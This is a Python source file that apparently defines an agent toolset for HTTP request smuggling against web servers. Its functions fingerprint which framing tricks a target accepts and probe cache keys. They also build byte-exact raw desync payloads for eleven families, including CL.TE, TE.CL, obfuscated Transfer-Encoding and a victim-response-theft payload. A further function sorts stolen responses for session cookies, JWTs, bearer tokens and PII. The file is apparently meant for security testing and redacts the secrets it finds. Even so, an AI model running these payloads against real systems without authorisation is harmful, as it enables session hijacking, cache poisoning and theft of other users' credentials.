"""HTTP desync (request smuggling) reconnaissance and payload construction.

Four tools that cover the mechanical work an agent gets wrong by hand when
hunting body-framing desync:

* ``desync_fingerprint`` — which framing primitives the target stack even
  accepts (Server/CDN, Transfer-Encoding values, duplicate Content-Length,
  Content-Length on bodyless methods). Probes run concurrently.
* ``desync_probe_cache`` — is there a caching layer, and which headers are in
  the cache key. Determines whether a confirmed desync escalates to cache
  poisoning.
* ``desync_build_payload`` — byte-exact raw HTTP/1.1 request text for the 11
  confirmed mechanism families. Content-Length and chunk sizes are computed
  from the real byte count, which is the single most common hand-crafting bug.
* ``desync_analyze_responses`` — classify responses stolen via victim-response
  theft (session tokens, JWTs, bearer creds, CSRF tokens, PII) and assign a
  severity. Values are redacted; full secrets are never returned.

Companion skill: ``http-desync-smuggling``.

Probes intentionally disable TLS verification: targets under test frequently
present self-signed, expired, or hostname-mismatched certificates, and a
verification failure would mask the framing behaviour being measured.
"""

from __future__ import annotations

import asyncio
import re
from typing import Annotated, Any, Literal

import httpx
from dreadnode.agents.tools import Toolset, tool_method

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Response header -> CDN / cache vendor. Order matters: first match wins.
_CDN_HEADERS: dict[str, str] = {
    "cf-ray": "cloudflare",
    "x-amz-cf-id": "cloudfront",
    "x-served-by": "fastly",
    "x-varnish": "varnish",
    "x-akamai-transformed": "akamai",
    "x-sucuri-id": "sucuri",
}

# Substrings that identify the origin stack from a 404 body.
_ERROR_SIGNATURES = (
    "nginx",
    "apache",
    "microsoft",
    "iis",
    "cloudflare",
    "varnish",
    "envoy",
)

# Headers worth testing for cache-key membership.
_CACHE_KEY_HEADERS = (
    "Accept-Language",
    "Cookie",
    "User-Agent",
    "Accept-Encoding",
    "Origin",
)

# A status in this set means the parser rejected the framing outright.
_REJECT_STATUSES = frozenset({400, 501})

Family = Literal[
    "byteranges",
    "cl-whitespace",
    "cl-duplicate",
    "cl-bodyless",
    "connect-cl",
    "te-gzip",
    "cl.te",
    "te.cl",
    "expect-dup",
    "te-obfuscated",
    "vrt",
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _compact(data: dict[str, Any]) -> dict[str, Any]:
    """Drop null/empty values so the model does not pay tokens for absent fields.

    ``0`` and ``False`` are meaningful signals here and are preserved.
    """
    return {k: v for k, v in data.items() if v not in (None, "", [], {})}


def _client(proxy: str, timeout: float = 10.0) -> httpx.AsyncClient:
    """Build a probing client. ``proxy`` of "" means direct."""
    return httpx.AsyncClient(
        headers={"User-Agent": _UA},
        timeout=httpx.Timeout(connect=5.0, read=timeout, write=5.0, pool=5.0),
        follow_redirects=True,
        verify=False,
        proxy=proxy or None,
    )


def _base_url(host: str) -> str:
    """Normalise a host or URL into a scheme-qualified origin with no trailing slash."""
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = f"https://{host}"
    return host.rstrip("/")


async def _settle(*coros: Any) -> list[Any]:
    """Run probes concurrently; a failed probe yields its exception, never aborts."""
    return await asyncio.gather(*coros, return_exceptions=True)


def _ok(result: Any, default: Any) -> Any:
    return default if isinstance(result, BaseException) else result


def _crlf(lines: list[str], body: str = "") -> str:
    """Join header lines with CRLF and append the body after a blank line."""
    return "\r\n".join(lines) + "\r\n\r\n" + body


# ---------------------------------------------------------------------------
# Fingerprint probes
# ---------------------------------------------------------------------------


async def _probe_identity(c: httpx.AsyncClient, url: str) -> dict[str, Any]:
    r = await c.head(url)
    out: dict[str, Any] = {
        "server": r.headers.get("server"),
        "via": r.headers.get("via"),
    }
    for header, vendor in _CDN_HEADERS.items():
        value = r.headers.get(header)
        if value:
            out["cdn"] = vendor
            out["cdn_evidence"] = f"{header}: {value}"
            break
    return out


async def _probe_error_page(c: httpx.AsyncClient, url: str) -> str | None:
    r = await c.get(f"{url}/nonexistent-desync-probe-path")
    body = r.text[:8192].lower()
    return next((sig for sig in _ERROR_SIGNATURES if sig in body), None)


async def _probe_te(c: httpx.AsyncClient, url: str, encoding: str) -> bool:
    """True when the server accepts this Transfer-Encoding value."""
    r = await c.post(
        url,
        content=b"0\r\n\r\n",
        headers={
            "Transfer-Encoding": encoding,
            "Content-Type": "application/octet-stream",
        },
    )
    return r.status_code not in _REJECT_STATUSES


async def _probe_duplicate_cl(c: httpx.AsyncClient, url: str) -> str:
    """Two identical Content-Length headers: rejected (RFC-correct) or accepted."""
    request = c.build_request(
        "GET", url, headers=[("Content-Length", "0"), ("Content-Length", "0")]
    )
    r = await c.send(request)
    return "reject" if r.status_code in _REJECT_STATUSES else "accept"


async def _probe_bodyless_cl(c: httpx.AsyncClient, url: str) -> str:
    """Content-Length with a body on GET — family 4 precondition."""
    request = c.build_request(
        "GET", url, content=b"x" * 8, headers={"Content-Length": "8"}
    )
    r = await c.send(request)
    return "reject" if r.status_code in _REJECT_STATUSES else "accept"


# ---------------------------------------------------------------------------
# Cache helpers
# ---------------------------------------------------------------------------


def _parse_max_age(cache_control: str | None) -> int | None:
    if not cache_control:
        return None
    match = re.search(
        r"(?:^|,)\s*(?:s-)?max-age\s*=\s*(\d+)", cache_control, re.IGNORECASE
    )
    return int(match.group(1)) if match else None


def _cache_evidence(
    response: httpx.Response, ages: list[int]
) -> tuple[bool, str | None]:
    """Decide whether a caching layer is present, and on what evidence."""
    if len(ages) >= 2 and ages[-1] > ages[0]:
        return True, f"age increasing: {ages}"

    x_cache = response.headers.get("x-cache", "")
    if "HIT" in x_cache.upper():
        return True, f"x-cache: {x_cache}"

    cf = response.headers.get("cf-cache-status", "")
    if cf.upper() in {"HIT", "MISS", "EXPIRED", "STALE", "REVALIDATED"}:
        return True, f"cf-cache-status: {cf}"

    varnish = response.headers.get("x-varnish", "")
    if len(varnish.split()) == 2:  # two IDs == served from cache
        return True, f"x-varnish: {varnish}"

    if response.headers.get("age") is not None:
        return True, f"age: {response.headers['age']}"

    return False, None


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------


def _smuggled(host: str, path: str) -> str:
    """The prefix that bleeds into the next request on the connection."""
    return f"GET {path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: X"


def build_payload(
    family: str, host: str, *, path: str = "/admin", method: str = "POST"
) -> dict[str, Any]:
    """Build a raw HTTP/1.1 request for one desync mechanism family.

    Content-Length values and chunk sizes are derived from the actual byte
    count of the constructed payload, so the request is wire-correct as-is.
    """
    prefix = _smuggled(host, path)
    n = len(prefix.encode())

    if family == "byteranges":
        body = f"--SMUGGLE\r\nContent-Range: bytes 0-10/100\r\n\r\nAAAAAAAAAA\r\n--SMUGGLE--\r\n{prefix}"
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                "Content-Type: multipart/byteranges; boundary=SMUGGLE",
                f"Content-Length: {len(body.encode())}",
            ],
            body,
        )
        note = "Front-end honours Content-Length; back-end stops at the --SMUGGLE-- boundary and treats the remainder as a new request."

    elif family == "cl-whitespace":
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                f" Content-Length: {n}",
                "Content-Length: 0",
            ],
            prefix,
        )
        note = "Leading-space Content-Length. Also try 'Content-Length : N', 'Content-Length\\t: N', and a leading tab."

    elif family == "cl-duplicate":
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                "Content-Length: 0",
                f"content-length: {n}",
            ],
            prefix,
        )
        note = "Conflicting Content-Length values, case-varied to evade header dedup. One layer takes the first, the other the last."

    elif family == "cl-bodyless":
        raw = _crlf(["GET / HTTP/1.1", f"Host: {host}", f"Content-Length: {n}"], prefix)
        note = "Content-Length on a bodyless method. The proxy drops the body per spec; the origin reads it as the next request."

    elif family == "connect-cl":
        raw = _crlf(
            [f"CONNECT {host}:443 HTTP/1.1", f"Host: {host}", f"Content-Length: {n}"],
            prefix,
        )
        note = "CONNECT with a pseudo-body on a keep-alive connection. Some proxies strip it, others forward it."

    elif family == "te-gzip":
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                "Transfer-Encoding: gzip",
                f"Content-Length: {n}",
            ],
            prefix,
        )
        note = "Non-chunked Transfer-Encoding. Parsers split between 'any TE means chunked' and 'unknown TE means ignore'."

    elif family == "cl.te":
        body = f"0\r\n\r\n{prefix}"
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                f"Content-Length: {len(body.encode())}",
                "Transfer-Encoding: chunked",
            ],
            body,
        )
        note = "Front-end uses Content-Length, back-end uses chunked. The back-end terminates at chunk 0 and the prefix starts the next request."

    elif family == "te.cl":
        chunk = f"{n:x}\r\n{prefix}\r\n0\r\n\r\n"
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                "Content-Length: 4",
                "Transfer-Encoding: chunked",
            ],
            chunk,
        )
        note = "Front-end reads the full chunked body; back-end reads only 4 bytes of Content-Length and treats the rest as a new request."

    elif family == "expect-dup":
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                f"Content-Length: {n}",
                "Expect: 100-continue",
                "Expect: 100-continue",
            ],
            prefix,
        )
        note = "Duplicated Expect headers desynchronise whether a layer waits for the body."

    elif family == "te-obfuscated":
        body = f"0\r\n\r\n{prefix}"
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                f"Content-Length: {len(body.encode())}",
                "Transfer-Encoding: chunked",
                "Transfer-Encoding: x",
            ],
            body,
        )
        note = "Second bogus Transfer-Encoding. Permute with 'xchunked', 'Transfer-Encoding : chunked', a tab before the value, and a trailing NUL."

    elif family == "vrt":
        # Victim response theft: the smuggled request declares a body large
        # enough to swallow the next victim's request headers.
        victim = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 300\r\n\r\nx="
        body = f"0\r\n\r\n{victim}"
        raw = _crlf(
            [
                f"{method} / HTTP/1.1",
                f"Host: {host}",
                f"Content-Length: {len(body.encode())}",
                "Transfer-Encoding: chunked",
            ],
            body,
        )
        note = "Victim response theft. The smuggled Content-Length: 300 absorbs the next victim's headers; if the endpoint reflects the body, their cookies leak."

    else:
        raise ValueError(
            f"Unknown family {family!r}. Choose one of: {', '.join(sorted(set(Family.__args__)))}"
        )

    return {
        "family": family,
        "raw_request": raw,
        "byte_length": len(raw.encode()),
        "note": note,
    }


# ---------------------------------------------------------------------------
# Stolen-response classification
# ---------------------------------------------------------------------------

_SESSION_COOKIE = re.compile(
    r"(?i)^(PHPSESSID|JSESSIONID|connect\.sid|_session_id|ASP\.NET_SessionId"
    r"|session|sid|SESS|sess_id|laravel_session|_rails_session)$"
)
_SET_COOKIE = re.compile(r"(?i)([^=;,\s]+)=([^;,\r\n]*)")
_JWT = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
_BEARER = re.compile(r"(?i)bearer\s+(\S{8,})")
_CSRF_INPUT = re.compile(
    r"""(?is)<input[^>]*\bname=["'](csrf|csrf_token|_token|_csrf_token|nonce|authenticity_token)["'][^>]*>""",
)
_VALUE_ATTR = re.compile(r"""(?i)\bvalue=["']([^"']*)["']""")
_EMAIL = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
_TEST_DOMAINS = frozenset(
    {"example.com", "example.org", "example.net", "test.com", "localhost"}
)

# Category -> severity, most severe first.
_SEVERITY_ORDER: tuple[tuple[frozenset[str], str], ...] = (
    (frozenset({"session_token", "jwt", "bearer_token"}), "critical"),
    (frozenset({"csrf_token"}), "high"),
    (frozenset({"pii"}), "medium"),
)


def _redact(value: str) -> str:
    """Truncate so a full secret never leaves this module."""
    if len(value) >= 16:
        return f"{value[:8]}...{value[-4:]}"
    if len(value) >= 5:
        return f"{value[:2]}..."
    return "***"


def _iter_headers(headers: dict[str, Any], name: str):
    """Yield values for a header name, tolerating list-valued duplicates."""
    for key, value in headers.items():
        if key.lower() != name:
            continue
        yield from (value if isinstance(value, list) else [value])


def _session_values(headers: dict[str, Any]) -> list[str]:
    found = []
    for raw in _iter_headers(headers, "set-cookie"):
        match = _SET_COOKIE.search(str(raw))
        if match and _SESSION_COOKIE.match(match.group(1).strip()):
            found.append(match.group(2).strip())
    return found


def analyze_responses(
    responses: list[dict[str, Any]], *, host: str = ""
) -> dict[str, Any]:
    """Classify captured victim responses and assign a severity.

    Each response is ``{"status": int, "headers": {...}, "body": str}``.
    Unique victims are counted by distinct session-cookie values.
    """
    findings: list[dict[str, str]] = []
    sessions: set[str] = set()

    def add(category: str, evidence: str, location: str) -> None:
        findings.append(
            {"category": category, "evidence": evidence, "location": location}
        )

    for response in responses:
        headers = response.get("headers") or {}
        body = str(response.get("body") or "")

        for value in _session_values(headers):
            sessions.add(value)
            add("session_token", _redact(value) if value else "(empty)", "header")

        for raw in _iter_headers(headers, "authorization"):
            match = _BEARER.search(str(raw))
            if match:
                add("bearer_token", _redact(match.group(1)), "header")

        header_blob = " ".join(f"{k}: {v}" for k, v in headers.items())
        if match := _JWT.search(header_blob):
            add("jwt", _redact(match.group(0)), "header")
        elif match := _JWT.search(body):
            add("jwt", _redact(match.group(0)), "body")

        if match := _CSRF_INPUT.search(body):
            value_match = _VALUE_ATTR.search(match.group(0))
            evidence = (
                _redact(value_match.group(1))
                if value_match and value_match.group(1)
                else "(present)"
            )
            add("csrf_token", evidence, "body")

        for match in _EMAIL.finditer(body):
            if match.group(0).rsplit("@", 1)[1].lower() not in _TEST_DOMAINS:
                add("pii", _redact(match.group(0)), "body")
                break

    categories = {f["category"] for f in findings}
    severity = next(
        (label for cats, label in _SEVERITY_ORDER if categories & cats), "low"
    )
    victims = len(sessions) or (1 if responses and findings else 0)

    return _compact(
        {
            "host": host,
            "total_responses": len(responses),
            "unique_victims": victims,
            "severity": severity,
            "categories": sorted(categories),
            "findings": findings,
            "summary": (
                f"{len(responses)} response(s) from ~{victims} victim(s); "
                f"{', '.join(sorted(categories)) if categories else 'nothing sensitive'} "
                f"-> {severity}"
            ),
        }
    )


# ---------------------------------------------------------------------------
# Toolset
# ---------------------------------------------------------------------------


class DesyncTools(Toolset):
    """HTTP request smuggling recon, payload construction, and impact analysis."""

    @tool_method(name="desync_fingerprint", catch=True)
    async def desync_fingerprint(
        self,
        host: Annotated[
            str, "Target host or origin URL, e.g. 'target.com' or 'https://target.com'"
        ],
        proxy: Annotated[
            str,
            "Proxy URL to route probes through, e.g. 'http://127.0.0.1:8080' for Caido. Empty for direct.",
        ] = "",
    ) -> dict[str, Any]:
        """Fingerprint which HTTP body-framing primitives a target stack accepts.

        Reports Server/Via headers, CDN vendor, origin signature from the error
        page, which Transfer-Encoding values are accepted (chunked/identity/gzip),
        whether duplicate Content-Length is rejected, and whether Content-Length
        on a bodyless GET is accepted. Probes run concurrently.

        Read the result as a technique filter: `te_chunked` false rules out
        CL.TE/TE.CL, `duplicate_cl: accept` opens family 3, `bodyless_cl:
        accept` opens family 4.
        """
        url = _base_url(host)
        async with _client(proxy) as c:
            (
                identity,
                error_sig,
                chunked,
                identity_te,
                gzip_te,
                dup_cl,
                bodyless,
            ) = await _settle(
                _probe_identity(c, url),
                _probe_error_page(c, url),
                _probe_te(c, url, "chunked"),
                _probe_te(c, url, "identity"),
                _probe_te(c, url, "gzip"),
                _probe_duplicate_cl(c, url),
                _probe_bodyless_cl(c, url),
            )

        return _compact(
            {
                "host": url,
                **_ok(identity, {}),
                "error_page_sig": _ok(error_sig, None),
                "te_chunked": _ok(chunked, False),
                "te_identity": _ok(identity_te, False),
                "te_gzip": _ok(gzip_te, False),
                "duplicate_cl": _ok(dup_cl, "unknown"),
                "bodyless_cl": _ok(bodyless, "unknown"),
            }
        )

    @tool_method(name="desync_probe_cache", catch=True)
    async def desync_probe_cache(
        self,
        host: Annotated[str, "Target host or origin URL"],
        path: Annotated[str, "Path to probe for cache behaviour"] = "/",
        proxy: Annotated[
            str, "Proxy URL to route probes through. Empty for direct."
        ] = "",
    ) -> dict[str, Any]:
        """Detect a caching layer and determine which headers are in the cache key.

        Confirms caching via increasing Age, X-Cache HIT, CF-Cache-Status,
        or paired X-Varnish IDs, then tests candidate headers for cache-key
        membership. Unkeyed headers are the escalation path: a confirmed
        desync plus an unkeyed header turns a medium finding into cache
        poisoning at CDN scale.
        """
        url = _base_url(host) + (path if path.startswith("/") else f"/{path}")

        async with _client(proxy) as c:
            responses = await _settle(*(c.get(url) for _ in range(3)))
            live = [r for r in responses if isinstance(r, httpx.Response)]
            if not live:
                return {
                    "host": url,
                    "has_cache": False,
                    "error": "no successful response",
                }

            ages = [int(a) for r in live if (a := r.headers.get("age", "")).isdigit()]
            has_cache, evidence = _cache_evidence(live[-1], ages)

            result: dict[str, Any] = {
                "host": url,
                "has_cache": has_cache,
                "evidence": evidence,
                "ttl_seconds": _parse_max_age(live[-1].headers.get("cache-control")),
            }
            if has_cache:
                result["cache_type"] = next(
                    (v for h, v in _CDN_HEADERS.items() if live[-1].headers.get(h)),
                    "generic",
                )

            # Cache-key membership only means anything once caching is confirmed
            # and Age is being emitted (Age is the differential signal).
            if has_cache and ages:
                baseline = ages[-1]
                probes = await _settle(
                    *(
                        c.get(url, headers={h: f"desync-probe-{i}"})
                        for i, h in enumerate(_CACHE_KEY_HEADERS)
                    )
                )
                keyed, unkeyed = [], []
                for header, probe in zip(_CACHE_KEY_HEADERS, probes, strict=True):
                    if not isinstance(probe, httpx.Response):
                        continue
                    age = probe.headers.get("age", "")
                    # A fresh (much lower) Age means the header split the cache key.
                    (
                        keyed if age.isdigit() and int(age) < baseline - 2 else unkeyed
                    ).append(header)
                result["keyed_headers"] = keyed
                result["unkeyed_headers"] = unkeyed
                result["cache_key_method"] = (
                    "Age differential: a header is keyed if adding it dropped Age by >2s. "
                    "Keyed is high confidence; unkeyed is a lead — confirm with a cache-buster "
                    "query param before relying on it."
                )

        return _compact(result)

    @tool_method(name="desync_build_payload", catch=True)
    async def desync_build_payload(
        self,
        family: Annotated[
            Family,
            "Mechanism family: byteranges (multipart/byteranges body-length confusion), "
            "cl-whitespace (obfuscated Content-Length), cl-duplicate (conflicting CL), "
            "cl-bodyless (CL on GET/HEAD), connect-cl (CONNECT with CL), te-gzip "
            "(non-chunked Transfer-Encoding), cl.te, te.cl, expect-dup (duplicated "
            "Expect: 100-continue), te-obfuscated (bogus second TE header), "
            "vrt (victim response theft)",
        ],
        host: Annotated[str, "Host header value for the request, e.g. 'target.com'"],
        path: Annotated[
            str,
            "Path for the smuggled request — the endpoint you want the victim to hit",
        ] = "/admin",
        method: Annotated[str, "Method for the outer request"] = "POST",
    ) -> dict[str, Any]:
        """Build a byte-exact raw HTTP/1.1 desync request for one mechanism family.

        Content-Length values and chunk sizes are computed from the real byte
        count of the constructed payload — the framing is wire-correct as
        returned, which hand-written smuggling payloads almost never are.

        Send the raw bytes over a socket or via a repeater. Do not pass the
        result to an HTTP client library: every client normalises the exact
        headers this attack depends on.
        """
        return build_payload(family, host, path=path, method=method)

    @tool_method(name="desync_analyze_responses", catch=True)
    async def desync_analyze_responses(
        self,
        responses: Annotated[
            list[dict[str, Any]],
            "Captured victim responses, each {'status': int, 'headers': {...}, 'body': str}",
        ],
        host: Annotated[str, "Target host, for the summary line"] = "",
    ) -> dict[str, Any]:
        """Classify responses stolen via victim-response theft and assign a severity.

        Detects session cookies, JWTs, bearer credentials, CSRF tokens, and
        email PII, then counts unique victims by distinct session-cookie value.
        Severity: critical (session/JWT/bearer), high (CSRF), medium (PII),
        low (nothing sensitive). Evidence values are redacted — full secrets
        are never returned.
        """
        return analyze_responses(responses, host=host)
